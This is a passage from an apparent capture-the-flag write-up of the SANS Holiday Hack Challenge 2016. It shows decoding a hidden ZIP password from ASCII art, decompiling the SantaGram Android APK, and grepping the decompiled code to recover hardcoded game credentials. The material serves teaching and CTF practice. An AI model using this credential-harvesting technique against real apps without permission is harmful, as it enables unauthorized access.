SANTAHOHOHOPEACEONEARTHSANTAQWWWWWWWWWWWWWWWWWWWWHOHOHOELFJOYCHRISTMASELFQQ
NORTHPOLESANTASANTANORTHPOLESANTAPEACEONEARTHCHRISTMASELFHOHOHOELFJOYWJOYQQ
JOYELFJOYNORTHPOLEPEACEONEARTHJOYGOODWILLTOWARDSMENPEACEONEARTHELFELFELFELF
SANTAJOYCHRISTMASQQWELFWGOODWILLTOWARDSMENSANTANORTHPOLENORTHPOLEJOYWSANTAQ
JOYPEACEONEARTHSANTAGOODWILLTOWARDSMENJOYPEACEONEARTHJOYELFJOYCHRISTMASJOYQ
PEACEONEARTHJOYHOHOHOJOYHOHOHONORTHPOLEHOHOHOGOODWILLTOWARDSMENPEACEONEARTH
SANTASANTAELFJOYQQP???????????????????????????????4PEACEONEARTHJOYQWSANTAQQ
ELFELFHOHOHOHOHOHOf...............................]GOODWILLTOWARDSMENJOYELF
SANTAJOYELFELFELFQf...............................]CHRISTMASNORTHPOLESANTAQ
SANTAHOHOHOELFJOYQf...............................]GOODWILLTOWARDSMENELFELF
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASJOYQWQ
JOYSANTAELFJOYELFQf...............................]PEACEONEARTHSANTAWHOHOHO
CHRISTMASCHRISTMASf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHSANTAQf...............................]HOHOHOHOHOHOJOYWHOHOHOWQ
JOYELFHOHOHOJOYELFf...............................]GOODWILLTOWARDSMENHOHOHO
SANTANORTHPOLEJOYQf...............................]PEACEONEARTHNORTHPOLEELF
HOHOHOGOODWILLTOWARDSMENSANTAWJOYQ&amp;#64;'.............sPEACEONEARTHELFWCHRISTMAS
GOODWILLTOWARDSMENHOHOHOCHRISTMASF............._yWWPEACEONEARTHELFELFJOYWQQ
SANTAGOODWILLTOWARDSMENQQWELFQQ&amp;#64;'.............sQWGOODWILLTOWARDSMENJOYJOYQQ
NORTHPOLECHRISTMASNORTHPOLEQQWF............._yQWELFELFELFSANTASANTAHOHOHOQQ
NORTHPOLECHRISTMASELFQQWELFQ&amp;#64;'.............aWCHRISTMASELFPEACEONEARTHQQWELF
SANTAHOHOHOHOHOHOJOYWSANTAQ?............._yQWPEACEONEARTHCHRISTMASQQWJOYJOY
CHRISTMASSANTACHRISTMASQQ&amp;#64;'.............aJOYNORTHPOLESANTAELFHOHOHOSANTAELF
SANTACHRISTMASNORTHPOLEW?............._yCHRISTMASCHRISTMASCHRISTMASHOHOHOQQ
PEACEONEARTHHOHOHOQWQQD'.............aHOHOHOHOHOHONORTHPOLEHOHOHOELFWHOHOHO
HOHOHOCHRISTMASELFELF!............._mGOODWILLTOWARDSMENCHRISTMASSANTASANTAQ
JOYPEACEONEARTHELFQD'.............aCHRISTMASPEACEONEARTHSANTAHOHOHOWSANTAQQ
NORTHPOLEJOYHOHOHOF..............&amp;quot;????????????????4PEACEONEARTHQQWHOHOHOELF
HOHOHOELFSANTAELFQf...............................]SANTAQWJOYWNORTHPOLEELFQ
HOHOHOPEACEONEARTHf...............................]PEACEONEARTHPEACEONEARTH
JOYPEACEONEARTHELFf...............................]HOHOHOSANTASANTASANTAELF
GOODWILLTOWARDSMENf...............................]PEACEONEARTHNORTHPOLEJOY
NORTHPOLEHOHOHOELFf...............................]HOHOHOCHRISTMASWSANTAELF
ELFSANTACHRISTMASQf...............................]SANTAJOYJOYQWSANTAJOYWQQ
HOHOHONORTHPOLEJOYf...............................]PEACEONEARTHSANTAHOHOHOQ
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASSANTAQ
PEACEONEARTHELFJOYf...............................]PEACEONEARTHJOYELFQQWJOY
JOYSANTAPEACEONEARTHSANTAWQQWQQWGOODWILLTOWARDSMENCHRISTMASJOYSANTASANTAJOY
ELFNORTHPOLESANTAELFHOHOHOJOYGOODWILLTOWARDSMENNORTHPOLECHRISTMASQWJOYWELFQ
HOHOHOCHRISTMASSANTAJOYCHRISTMASHOHOHOSANTAELFQQWJOYHOHOHOJOYJOYELFJOYELFQQ
CHRISTMASJOYJOYHOHOHOHOHOHOJOYPEACEONEARTHSANTAELFGOODWILLTOWARDSMENELFELFQ
HOHOHOELFHOHOHOJOYNORTHPOLEHOHOHOCHRISTMASQ???????4GOODWILLTOWARDSMENELFELF
NORTHPOLECHRISTMASQQWELFWELFWPEACEONEARTHQQ.......]HOHOHOCHRISTMASQWELFELFQ
JOYJOYGOODWILLTOWARDSMENSANTAELFQWNORTHPOLE.......]PEACEONEARTHCHRISTMASJOY
JOYELFCHRISTMASELFHOHOHOPEACEONEARTHJOYJOYQ.......]GOODWILLTOWARDSMENHOHOHO
NORTHPOLESANTAELFQQWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASCHRISTMASJOYQWQ
HOHOHOSANTAELFNORTHPOLEPEACEONEARTHELFQWELF.......]SANTAHOHOHOELFSANTAELFQQ
HOHOHOSANTAPEACEONEARTHELFWJOYWSANTAQWELFQQ.......]NORTHPOLENORTHPOLEWELFQQ
SANTAHOHOHOELFELFNORTHPOLENORTHPOLEWELFJOYQ.......]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWGOODWILLTOWARDSMEN.......]SANTASANTAHOHOHOQWHOHOHO
SANTANORTHPOLESANTAWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASPEACEONEARTHJOY
ELFHOHOHONORTHPOLEP????????????????????????.......]CHRISTMASSANTAQQWJOYELFQ
PEACEONEARTHSANTAQf...............................]ELFHOHOHOSANTAELFJOYELFQ
ELFCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHHOHOHOf...............................]GOODWILLTOWARDSMENJOYJOY
CHRISTMASNORTHPOLEf...............................]HOHOHONORTHPOLEQWJOYELFQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENSANTAQ
JOYJOYELFSANTAELFQf...............................]SANTANORTHPOLEELFSANTAWQ
JOYHOHOHOSANTAJOYQf...............................]PEACEONEARTHNORTHPOLEELF
SANTAELFELFHOHOHOQf...............................]CHRISTMASPEACEONEARTHELF
HOHOHONORTHPOLEELFf...............................]NORTHPOLEHOHOHOJOYWSANTA
PEACEONEARTHELFJOY6aaaaaaaaaaaaaaaaaaaaaaaa.......]PEACEONEARTHHOHOHOSANTAQ
CHRISTMASELFELFJOYQQWWWWWWWWWWWWWWWWWWWWWQQ.......]NORTHPOLENORTHPOLESANTAQ
NORTHPOLECHRISTMASHOHOHONORTHPOLEHOHOHOJOYQ.......]PEACEONEARTHELFQQWHOHOHO
JOYPEACEONEARTHJOYCHRISTMASPEACEONEARTHELFQ.......]NORTHPOLEJOYPEACEONEARTH
NORTHPOLECHRISTMASPEACEONEARTHHOHOHOSANTAQQ.......]PEACEONEARTHCHRISTMASELF
HOHOHOHOHOHONORTHPOLEELFCHRISTMASHOHOHOELFQ.......]HOHOHONORTHPOLEELFSANTAQ
NORTHPOLEJOYHOHOHOQQWPEACEONEARTHCHRISTMASQ.......]ELFHOHOHOELFSANTAJOYQQWQ
ELFJOYJOYJOYNORTHPOLEJOYPEACEONEARTHSANTAQQ.......]CHRISTMASELFELFQQWHOHOHO
SANTASANTACHRISTMASNORTHPOLENORTHPOLEELFJOY.......]PEACEONEARTHPEACEONEARTH
ELFPEACEONEARTHJOYQWJOYJOYSANTAHOHOHOJOYELF.......]GOODWILLTOWARDSMENJOYQWQ
JOYCHRISTMASJOYCHRISTMASJOYWNORTHPOLEJOYJOYaaaaaaajCHRISTMASPEACEONEARTHJOY
PEACEONEARTHCHRISTMASPEACEONEARTHWELFWSANTAWWWWWWCHRISTMASJOYNORTHPOLEJOYQQ
SANTACHRISTMASSANTAELFJOYQWNORTHPOLEELFSANTAELFQQP]NORTHPOLESANTAJOYWJOYWQQ
ELFJOYCHRISTMASNORTHPOLEWPEACEONEARTHNORTHPOLEQ&amp;#64;^.]HOHOHOHOHOHOELFCHRISTMAS
HOHOHOELFSANTASANTAWNORTHPOLENORTHPOLEJOYQWELFP`..]CHRISTMASPEACEONEARTHJOY
CHRISTMASJOYPEACEONEARTHJOYSANTAQWCHRISTMASQ&amp;#64;&amp;quot;....]JOYGOODWILLTOWARDSMENJOY
GOODWILLTOWARDSMENJOYJOYWHOHOHOHOHOHOQQWELFP`.....]GOODWILLTOWARDSMENELFELF
ELFSANTAHOHOHOGOODWILLTOWARDSMENCHRISTMASW&amp;quot;.......]PEACEONEARTHELFQQWELFWQQ
GOODWILLTOWARDSMENNORTHPOLEPEACEONEARTHQP`........]GOODWILLTOWARDSMENSANTAQ
CHRISTMASHOHOHOELFQWJOYWSANTAJOYWELFQQW&amp;quot;..........]GOODWILLTOWARDSMENELFELF
JOYHOHOHOGOODWILLTOWARDSMENHOHOHOELFQP`...........]NORTHPOLENORTHPOLEHOHOHO
PEACEONEARTHGOODWILLTOWARDSMENWJOYQW&amp;quot;.............]HOHOHOHOHOHONORTHPOLEJOY
ELFPEACEONEARTHJOYCHRISTMASHOHOHOQP`..............]PEACEONEARTHSANTAWELFWQQ
NORTHPOLEHOHOHOJOYELFSANTAQQWJOYW!................yPEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYP?????????????`...............sPEACEONEARTHJOYJOYSANTAELF
JOYHOHOHOELFHOHOHOf..........................._mWQWNORTHPOLECHRISTMASHOHOHO
GOODWILLTOWARDSMENf..........................jCHRISTMASNORTHPOLESANTAJOYJOY
NORTHPOLEHOHOHOELFf........................_JOYPEACEONEARTHELFJOYJOYWJOYWQQ
GOODWILLTOWARDSMENf......................_yGOODWILLTOWARDSMENCHRISTMASELFQQ
NORTHPOLENORTHPOLEf.....................:GOODWILLTOWARDSMENSANTASANTAELFJOY
ELFNORTHPOLEJOYJOYf......................-9NORTHPOLEPEACEONEARTHCHRISTMASQQ
NORTHPOLEELFSANTAQf........................?WGOODWILLTOWARDSMENHOHOHOSANTAQ
GOODWILLTOWARDSMENf..........................4WJOYPEACEONEARTHHOHOHOWELFWQQ
PEACEONEARTHSANTAQf...........................-$SANTACHRISTMASHOHOHOELFJOYQ
HOHOHOELFJOYJOYJOY6aaaaaaaaaaaaa,...............?WWPEACEONEARTHPEACEONEARTH
JOYELFHOHOHOJOYSANTAWWWWWWWWWWWQQc...............-4NORTHPOLEHOHOHOQWJOYELFQ
NORTHPOLEGOODWILLTOWARDSMENSANTAWWg,..............]GOODWILLTOWARDSMENSANTAQ
NORTHPOLEHOHOHOELFHOHOHOCHRISTMASELFc.............]HOHOHOELFSANTAWCHRISTMAS
PEACEONEARTHJOYJOYNORTHPOLESANTAJOYWWg,...........]GOODWILLTOWARDSMENJOYQWQ
ELFHOHOHOELFHOHOHOCHRISTMASCHRISTMASJOYc..........]HOHOHOJOYELFQWCHRISTMASQ
PEACEONEARTHSANTAJOYWCHRISTMASJOYSANTAWWw,........]PEACEONEARTHHOHOHOELFELF
CHRISTMASJOYPEACEONEARTHSANTAPEACEONEARTHQc.......]PEACEONEARTHSANTAELFQWQQ
NORTHPOLEPEACEONEARTHJOYNORTHPOLEJOYELFQQWWw......]PEACEONEARTHWHOHOHOJOYQQ
GOODWILLTOWARDSMENQWHOHOHOQWNORTHPOLEELFELFQQ/....]PEACEONEARTHNORTHPOLEJOY
ELFGOODWILLTOWARDSMENCHRISTMASJOYWJOYWSANTAJOYg...]SANTASANTAHOHOHOJOYQWJOY
NORTHPOLEPEACEONEARTHGOODWILLTOWARDSMENELFELFQWQ,.]PEACEONEARTHNORTHPOLEJOY
CHRISTMASCHRISTMASJOYSANTAWGOODWILLTOWARDSMENQQWQwjPEACEONEARTHSANTAQWJOYQQ
ELFPEACEONEARTHJOYJOYJOYWSANTAQQWPEACEONEARTHCHRISTMASGOODWILLTOWARDSMENJOY
CHRISTMASJOYJOYJOYQWGOODWILLTOWARDSMENSANTAQQWGOODWILLTOWARDSMENJOYWHOHOHOQ
PEACEONEARTHSANTACHRISTMASSANTAELFELFQQWJOYWGOODWILLTOWARDSMENHOHOHOHOHOHOQ
PEACEONEARTHELFELFSANTAQWJOYNORTHPOLEPEACEONEARTHELFSANTAHOHOHOPEACEONEARTH
NORTHPOLECHRISTMASELFNORTHPOLEELFJOYQWCHRISTMASGOODWILLTOWARDSMENNORTHPOLEQ
JOYJOYSANTAJOYSANTACHRISTMASJOYQWPEACEONEARTHNORTHPOLECHRISTMASJOYHOHOHOELF
JOYPEACEONEARTHELFQWELFWCHRISTMASSANTASANTANORTHPOLEQWPEACEONEARTHJOYWJOYWQ
&lt;/pre&gt;
&lt;p&gt;Hope your neck is not stiff, 'cause you need to tilt your head to the right
to see the hidden message: &lt;code&gt;Bug Bounty&lt;/code&gt;. It so happens that the password
to the ZIP file is &lt;code&gt;bugbounty&lt;/code&gt;. We can now extract the APK file from the
ZIP archive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip SantaGram_v4.2.zip
Archive:  SantaGram_v4.2.zip
&lt;span class="o"&gt;[&lt;/span&gt;SantaGram_v4.2.zip&lt;span class="o"&gt;]&lt;/span&gt; SantaGram_4.2.apk password: bugbounty
  inflating: SantaGram_4.2.apk
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-2-awesome-package-konveyance"&gt;
&lt;h2&gt;Part 2: Awesome Package Konveyance&lt;/h2&gt;
&lt;p&gt;Let's take a look at this APK, then! We can use &lt;a class="reference external" href="https://github.com/skylot/jadx"&gt;JADX&lt;/a&gt;
to decompile the APK.&lt;/p&gt;
&lt;p&gt;Since we're looking for credentials, we can then &lt;code&gt;grep&lt;/code&gt; on
&lt;code&gt;username&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, etc., to find what we're looking for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep --include &lt;span class="s2"&gt;&amp;quot;*.java&amp;quot;&lt;/span&gt; -Rn password .
./android/support/v4/j/a/c.java:529:        stringBuilder.append&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;; password: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.append&lt;span class="o"&gt;(&lt;/span&gt;k&lt;span class="o"&gt;())&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/Login.java:36:        this.c &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;EditText&lt;span class="o"&gt;)&lt;/span&gt; findViewById&lt;span class="o"&gt;(&lt;/span&gt;R.id.passwordTxt&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/Login.java:104:                                    aVar.b&lt;span class="o"&gt;((&lt;/span&gt;CharSequence&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;We&amp;#39;ve sent you an email to reset your password!&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.a&lt;span class="o"&gt;((&lt;/span&gt;int&lt;span class="o"&gt;)&lt;/span&gt; R.string.app_name&lt;span class="o"&gt;)&lt;/span&gt;.a&lt;span class="o"&gt;((&lt;/span&gt;CharSequence&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;, null&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/SignUp.java:22:    EditText passwordTxt&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/SignUp.java:29:        inputMethodManager.hideSoftInputFromWindow&lt;span class="o"&gt;(&lt;/span&gt;this.passwordTxt.getWindowToken&lt;span class="o"&gt;()&lt;/span&gt;, 0&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/SignUp.java:46:        this.passwordTxt &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;EditText&lt;span class="o"&gt;)&lt;/span&gt; findViewById&lt;span class="o"&gt;(&lt;/span&gt;R.id.passwordTxt2&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/northpolewonderland/santagram/SignUp.java:56:                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;this.a.usernameTxt.getText&lt;span class="o"&gt;()&lt;/span&gt;.toString&lt;span class="o"&gt;()&lt;/span&gt;.matches&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; this.a.passwordTxt.getText&lt;span class="o"&gt;()&lt;/span&gt;.toString&lt;span class="o"&gt;()&lt;/span&gt;.matches&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; this.a.fullnameTxt.getText&lt;span class="o"&gt;()&lt;/span&gt;.toString&lt;span class="o"&gt;()&lt;/span&gt;.matches&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
./com/northpolewonderland/santagram/SignUp.java:68:                parseUser.setPassword&lt;span class="o"&gt;(&lt;/span&gt;this.a.passwordTxt.getText&lt;span class="o"&gt;()&lt;/span&gt;.toString&lt;span class="o"&gt;())&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="hll"&gt;./com/northpolewonderland/santagram/b.java:91:            jSONObject.put&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;busyreindeer78&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;./com/northpolewonderland/santagram/SplashScreen.java:53:            jSONObject.put&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;busyreindeer78&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseRESTUserCommand.java:39:        hashMap.put&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;, str2&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseUser.java:20:    private static final String &lt;span class="nv"&gt;KEY_PASSWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseUser.java:252:            throw new IllegalArgumentException&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Must specify a password for the user to log in with&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseUser.java:795:                final String &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; currentUser.getPassword&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseUser.java:810:                                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;password !&lt;span class="o"&gt;=&lt;/span&gt; null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
./com/parse/ParseUser.java:811:                                    currentUser.setPassword&lt;span class="o"&gt;(&lt;/span&gt;password&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
./com/parse/ParseUser.java:998:            throw new ParseException&lt;span class="o"&gt;(&lt;/span&gt;-1, &lt;span class="s2"&gt;&amp;quot;Unable to saveEventually on a ParseUser with dirty password&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We see that the file &lt;code&gt;./com/northpolewonderland/santagram/b.java&lt;/code&gt; is
interesting. If we open it, we'll find our wanted credentials:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File ./com/northpolewonderland/santagram/b.java, line 87&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;Context&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;busyreindeer78&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;usage&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;activity&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Runnable&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;analytics_usage_url&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}).&lt;/span&gt;&lt;span class="na"&gt;start&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;e&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMessage&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The credentials in the APK file are &lt;code&gt;guest/busyreindeer78&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We're then supposed to look at an audio file. To do this, we have to take a
look at the resources of the APK file. To do this, we'll unzip the APK. Indeed,
APK files are just particular ZIP files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip -d SantaGram_4.2_unzipped SantaGram_4.2.apk
Archive:  SantaGram_4.2.apk
  inflating: SantaGram_4.2_unzipped/AndroidManifest.xml
  inflating: SantaGram_4.2_unzipped/META-INF/CERT.RSA
  inflating: SantaGram_4.2_unzipped/META-INF/CERT.SF
  inflating: SantaGram_4.2_unzipped/META-INF/MANIFEST.MF
  inflating: SantaGram_4.2_unzipped/assets/tou.html
  inflating: SantaGram_4.2_unzipped/classes.dex
&lt;span class="o"&gt;[&lt;/span&gt;snip &lt;span class="k"&gt;for&lt;/span&gt; brievety&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="hll"&gt; extracting: SantaGram_4.2_unzipped/res/raw/discombobulatedaudio1.mp3
&lt;/span&gt; extracting: SantaGram_4.2_unzipped/resources.arsc
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The name of the audio file in the SantaGram APK file is
&lt;code&gt;discombobulatedaudio1.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="part-3-a-fresh-baked-holiday-pi"&gt;
&lt;h2&gt;Part 3: A Fresh-Baked Holiday Pi&lt;/h2&gt;
&lt;p&gt;Despite what we've learned on the SantaGram bug bounty program, we're nowhere
closer to learn where Santa Claus is being held. By roaming the North Pole,
we can see password protected doors:&lt;/p&gt;
&lt;img alt="password_protected_door.png" class="align-center" src="/images/sans-christmas-challenge-2016/password_protected_door.png" /&gt;
&lt;p&gt;Next to these doors, we can see little terminals. However, in order to interact
with these terminals, we need a little system called a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Raspberry_Pi"&gt;Cranberry Pi&lt;/a&gt;.
In a sense, we're in luck because by talking to the elf Wunorse Openslae
(&lt;a class="reference external" href="https://www.youtube.com/watch?v=3PgNPc-iFW8"&gt;hey!&lt;/a&gt;), we learn that Santa's
sleigh is equiped with a Cranberry Pi, to control the SCADA interface:&lt;/p&gt;
